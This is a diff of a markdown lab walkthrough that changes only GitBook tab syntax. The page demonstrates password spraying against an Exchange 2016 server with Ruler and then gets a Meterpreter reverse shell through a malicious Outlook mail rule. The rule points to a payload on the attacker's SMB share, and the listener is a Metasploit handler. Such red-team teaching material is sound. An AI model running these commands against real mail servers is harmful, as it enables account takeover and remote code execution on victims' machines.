@@ -36,13 +36,13 @@ Standard password brute-forcing could be illustrated with the following table:
 
 Let's try doing a password spray against an Exchange 2016 server in a `offense.local` domain:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@kali" %}
+{% tabs %}
+{% tab title="attacker@kali" %}
 ```csharp
 ruler -k --domain offense.local brute --users users --passwords passwords --verbose
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![](../../.gitbook/assets/screenshot-from-2018-12-23-15-09-03.png)
 
@@ -72,13 +72,13 @@ A high level overwiew of how the spraying and remote code execution works:
 
 Let's validate the compromised credentials are working by checking if there are any email rules created already:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@kali" %}
+{% tabs %}
+{% tab title="attacker@kali" %}
 ```csharp
 ruler -k --verbose --email spotless@offense.local -u spotless -p 123456  display
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 The below suggests the credentials are working and that no mail rules are set for this account yet:
 
@@ -88,36 +88,36 @@ To carry out the attack further, I've generated a reverse meterpreter payload an
 
 We now need to create an SMB share that is accessible to our victim host and point it to the location where our payload evilm64.exe is located:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@kali" %}
+{% tabs %}
+{% tab title="attacker@kali" %}
 ```csharp
 smbserver.py tools /root/tools/
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 Next, we setup a metasploit listener to catch the incoming reverse shell:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@kali" %}
+{% tabs %}
+{% tab title="attacker@kali" %}
 ```csharp
 use exploit/multi/handler 
 set lhost 10.0.0.5
 set lport 443
 exploit
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 Finally, we fire up the ruler and create the malicious email rule:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@kali" %}
+{% tabs %}
+{% tab title="attacker@kali" %}
 ```csharp
 ruler -k --verbose --email spotless@offense.local --username spotless -p 123456  add --location '\\10.0.0.5\tools\\evilm64.exe' --trigger "popashell" --name maliciousrule --send --subject popashell
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 Below shows the entire attack and all of the steps mentioned above in action - note how the compromised mailbox does not even get to see the malicious email coming in:
 
@@ -129,13 +129,13 @@ Below shows the actual malicious rule that got created as part of the attack - n
 
 If you want to delete the malicious email rule, do this:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@kali" %}
+{% tabs %}
+{% tab title="attacker@kali" %}
 ```csharp
 ruler -k --verbose --email spotless@offense.local --username spotless -p 123456 delete --name maliciousrule
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ## Detection & Mitigation
 
